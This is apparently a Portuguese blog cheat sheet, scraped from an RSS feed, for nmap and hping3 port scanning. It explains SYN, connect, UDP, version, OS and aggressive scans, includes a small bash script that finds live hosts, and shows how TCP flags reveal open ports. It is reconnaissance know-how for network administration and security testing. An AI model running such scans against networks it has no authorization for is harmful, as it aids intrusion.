Varredura de porta TCP SYN (padrão)
nmap -sS 192.168.1.1 Tentativas para determinar a versão do serviço em execução na porta
nmap -sV 192.168.1.1 Scan com scripts NSE padrão. Considerado útil para descoberta e segurança
nmap -sC 192.168.1.1 Desative a descoberta de host. Somente varredura de porta.
nmap -Pn 192.168.1.1-5 Scan agressivo (4) mais acelerado, utilizar somente quando você estiver em uma rede razoavelmente rápida e confiável.
nmap -T4 192.168.1.1 Aumente o nível de verbosidade (-v ou use -vv mais para obter um efeito maior)
nmap -v 192.168.1.1 Envie pacotes não mais lentos que &amp;lt;número&amp;gt; por segundo. (&amp;ndash;min-rate)
nmap --min-rate=1000 192.168.1.1 Envie pacotes não mais rapidos que &amp;lt;número&amp;gt; por segundo. (&amp;ndash;max-rate)
nmap --max-rate=1000 192.168.1.1 Efetua o handshake triplo do TCP. O Nmap solicita ao sistema operacional subjacente que estabeleça uma conexão com o destino na porta especificada.
nmap -sT 192.168.1 Envia um SYN TCP para ver se a porta de destino responde com um SYN ACK (porta aberta) ou um RST (porta fechada). Também conhecida como varredura semi-aberta, pois não conclui o handshake do TCP. Esse é o padrão para usuários root.
nmap -sS 192.168.1 Realiza uma varredura UDP. Como o UDP não usa um handshake, um serviço escutando uma porta UDP pode não enviar nenhuma resposta. As portas que enviam uma resposta são exibidas como abertas. -sU (varredura UDP).
nmap -sU 192.168.1.50 Ativa a detecção do SO.
nmap -O 192.168.1.50 Quantos hosts ativos.
nmap -sP 192.168.1.0/24 Script para automatizar o processo de Scan em hosts ativos, pode personalizar com suas flags favoritas.
# nano maroto_scan.sh
#!/bin/bash echo &amp;#34;Insira o Range:&amp;#34; read RANGE nmap -sP $RANGE | grep for | cut -d &amp;#34; &amp;#34; -f5 echo &amp;#34;Isso aê&amp;#34; Para tornar executável o script faça:
# chmod &#43;x maroto_scan.sh &amp;gt;&amp;gt;Resumo Porta aberta = SYN &#43; ACK Porta Fechada = RST # hping3 --syn -c 1 -p 80 sitedeteste.com SYN ACK = Flag:SA # hping3 --syn -c 1 -p 8000 192.168.0.11 RST = Flag:RA ( reset ack ) # nmap -sS -p 80 192.168.0.113 (sem ruidos) # nmap -sV -p 80 192.168.0.113 (versoes dos serviços, porém bem barulhento) # nmap -A 192.168.0.113 (full scan, ele vai utilizaar recursos do NMAP para filtrar o maxímo que conseguir) ]]></content:encoded>
    </item>
  </channel>
</rss>
